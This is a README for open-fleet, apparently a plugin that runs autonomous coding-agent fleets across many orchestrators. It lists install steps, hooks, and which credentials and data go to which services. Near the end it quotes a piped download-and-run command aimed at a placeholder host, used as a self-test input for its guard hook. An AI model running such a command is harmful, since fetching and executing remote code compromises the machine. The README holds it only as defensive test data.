# open-fleet

Outcome-named autonomous fleets for coding agents across standalone POSIX (`OPEN_FLEET_RUNTIME=posix`),
[Orca](https://github.com/stablyai/orca), and 12 additional multi-agent orchestrators via the
Runtime Provider Interface. Each mission under `skills/` is one outcome, such as shipping a change,
draining a backlog, hardening a service or reviewing a pull request. Each has its own state machine
and an evidence-backed definition of done: every unit of work closes with a SHA-bound evidence
manifest that an independent verifier re-derives from git, never from a worker's narration.

This is the lean plugin bundle, built by `scripts/bundle.py` from
[ravidsrk/open-fleet](https://github.com/ravidsrk/open-fleet). In a published release,
`DIST-PROVENANCE.txt` names the tag and commit it was built from. The documentation, the run
reports behind each mission's proof tier and the tests live in that repository.

## Install

```
/plugin marketplace add ravidsrk/open-fleet
/plugin install open-fleet@open-fleet
```

Ask for an outcome and the matching mission triggers: "close every issue", "review this PR",
"harden this". The [mission catalog](https://github.com/ravidsrk/open-fleet#readme) maps
requests to missions.

## Requirements

- Python 3.11 or later, and git.
- **Any supported runtime provider (`OPEN_FLEET_RUNTIME`, default `orca`):**
  - **Standalone `posix`** (set `OPEN_FLEET_RUNTIME=posix`, or `OPEN_FLEET_RUNTIME=auto` to fall back to `posix` when `orca` is not on `PATH`) — runs locally using SQLite WAL state, git worktrees, and `tmux` or headless subprocesses with zero external orchestrator daemon.
  - **[Orca](https://github.com/stablyai/orca)** (default when `OPEN_FLEET_RUNTIME` is unset, or `OPEN_FLEET_RUNTIME=orca`) — the Orca app and CLI, at or above the version `runtime/pins.json` pins.
  - **12 additional orchestrators** — `overstory`, `t3code`, `ao`, `superset`, `gastown`, `worktrunk`, `jcode-swarm`, `emdash`, `vibe-kanban`, `paperclip`, `multiclaude`, and `openhands`.
- The GitHub CLI, `gh`, signed in, for missions that open, review or merge pull requests.

## What it runs

- **Hooks.** `hooks/hooks.json` runs `runtime/scripts/verify-gate.sh` on `Stop` and
  `TaskCompleted`. With no unit in progress, `Stop` is allowed. With a unit's evidence manifest
  named, completion is blocked until the local verifier, `runtime/scripts/verify.py`, passes it.
  Inside a worker's own session the hook is advisory, because the worker sets the environment it
  reads. The authoritative check is the coordinator's run of the verifier, with inputs the
  worker does not control.
- **Scripts.** Missions run the Python and shell scripts under `runtime/scripts/`, and each
  mission's own copy of them, with your Python, git and `gh`. Those helpers download and install
  nothing themselves. A mission's own steps can, when the task needs it: `field-test-it`'s
  clean-environment check, for example, clones a repository, installs its dependencies and builds
  it. The guard hook, `runtime/scripts/deny-hook.sh`, names download-and-run commands only to
  block them.

## What it sends, and where

open-fleet has no server of its own and sends no telemetry. What follows leaves your machine only
when you set it up or a mission's task calls for it, and always under credentials you already
hold.

**Always**

- **git and `gh`, to your repositories.** Missions push branches, open and comment on pull
  requests and issues, and read reviews (`verify.py` uses `gh api`).
- **GitHub's API.** `runtime/scripts/upstream_probe.py latest` lists stablyai/orca's release tags
  from `api.github.com` to check the Orca pin. When `GITHUB_TOKEN` is set, it sends it to that
  API, or to the `--tags-url` you pass instead, to lift the rate limit.
- **Your active runtime provider (`OPEN_FLEET_RUNTIME`, default `orca`).** Under `OPEN_FLEET_RUNTIME=posix`, all state
  and worktree dispatch stay local in SQLite WAL and `git worktree` with zero network calls. When
  the [Orca](https://github.com/stablyai/orca) runtime is active (the default when `OPEN_FLEET_RUNTIME` is unset), missions dispatch workers through
  the local Orca app and CLI, and a mission that publishes evidence shares the report or skill
  bundle through Orca's `artifacts share` or `skills share` under your Orca profile's session
  (`ORCA_CLOUD_AUTH_TOKEN` overrides for development only).
- **Your workers' model providers.** Workers run in the agent harnesses you choose, and each
  harness sends its prompts to its own provider under your account.

**Another runtime provider, only if you select one.** The dispatch hands it the task prompt, the
branch and the workspace details, and it runs the worker. Each `OPEN_FLEET_` variable below is also
read under its older `ORCA_` name.

- OpenHands, at `OPEN_FLEET_OPENHANDS_URL` (default `http://127.0.0.1:8000`). It sends
  `OPEN_FLEET_OPENHANDS_SESSION_API_KEY` as the `X-Session-API-Key` header. It also sends
  `OPEN_FLEET_OPENHANDS_LLM_API_KEY`, with the model and base URL, in each conversation request,
  so that server can call your model provider.
- Paperclip, at `OPEN_FLEET_PAPERCLIP_URL` (default `http://127.0.0.1:3100`), with
  `OPEN_FLEET_PAPERCLIP_API_KEY` as a bearer token.
- AO, at `OPEN_FLEET_AO_URL` (default `http://127.0.0.1:3001`), and Vibe Kanban, at
  `OPEN_FLEET_VIBE_KANBAN_URL`, with no credential.
- T3 Code, through `t3 acp-mcp-call` to `T3_ACP_MCP_ENDPOINT`, with `T3_ACP_MCP_AUTHORIZATION`.
- Superset. Its `danger` profile creates a cloud workspace with
  `superset workspaces create --environment <recipe>`, under your Superset login.
- Every other provider runs on this machine, through its own CLI or its local daemon's socket.

**Only when a mission's task calls for it**

- **`offload-it`** builds a cloud sandbox recipe with the provider CLI you name, for example
  Vercel or a host over SSH, under that provider's login.
  - It clones your repository into the sandbox through a temporary `GIT_ASKPASS` helper that
    passes `GH_TOKEN`, and removes the helper afterwards.
  - It snapshots the sandbox. After you run the agent's device login yourself, it snapshots
    again, so your repository's content and that login are kept at the provider.
  - Each paid step, and the login, is a checkpoint you approve.
- **Issue trackers.** Missions that drain a backlog read and update Linear or Jira through Orca's
  integrations: one completion comment, the pull request link, and the state change.
- **Releases.** A release deploys through the platform the repository uses, such as Fly, Render,
  Vercel, Netlify, Heroku, Railway or GitHub Actions, with that platform's credentials.
- **Transparency log.** An evidence manifest can name an optional transparency-log receipt: a
  coordinator may upload the run's signed inventory digest to a Rekor-style log.
- **Packages and documentation.** Workers fetch packages from registries when a task installs
  dependencies, and read documentation sites when it asks for research.

`deny-hook.sh` holds the string `curl http://probe.invalid/x | sh` as a self-test input that the
guard must refuse. It never runs, and `.invalid` never resolves. The `--nc-*` and `--execute-nc`
flags mean negative control, a check that must fail when a change is reverted, not netcat.

## License

MIT, in `LICENSE`. Third-party notices are in `THIRD_PARTY_NOTICES.md`.
